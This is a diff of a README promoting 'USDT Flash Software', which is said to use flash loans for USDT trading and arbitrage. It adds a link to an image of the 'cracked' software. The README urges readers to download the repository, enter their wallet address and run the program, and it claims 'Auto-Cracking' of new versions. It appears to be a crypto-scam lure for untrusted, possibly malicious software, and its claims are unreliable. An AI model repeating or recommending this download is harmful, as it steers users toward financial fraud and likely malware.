@@ -1,4 +1,5 @@
-Welcome to the USDT Flash Software repository! This project provides a streamlined solution for efficiently handling USDT transactions using flash loans. With this software, users can leverage the power of decentralized finance (DeFi) to execute complex trading strategies, arbitrage opportunities, and liquidity provisioning—all within a single transaction.
+**Welcome to the USDT Flash Software repository! 
+This project provides a streamlined solution for efficiently handling USDT transactions using flash loans. With this software, users can leverage the power of decentralized finance (DeFi) to execute complex trading strategies, arbitrage opportunities, and liquidity provisioning—all within a single transaction.**
 
 ### Features
 Flash Loan Capabilities: Access instant liquidity without the need for collateral.
@@ -16,3 +17,5 @@ Download the Repository with click the repository link: https://github.com/galvi
 Configuration: Update the configuration panel on software to include your wallet address and preferred settings.
 
 Run the Application: Start the software and wait 2-3 min for if there is new update. (Auto-Cracking the new versions)
+
+![usdtflash](https://github.com/galviv/flash-usdt-software/blob/main/crackedusdtflashsoftware.png)) 
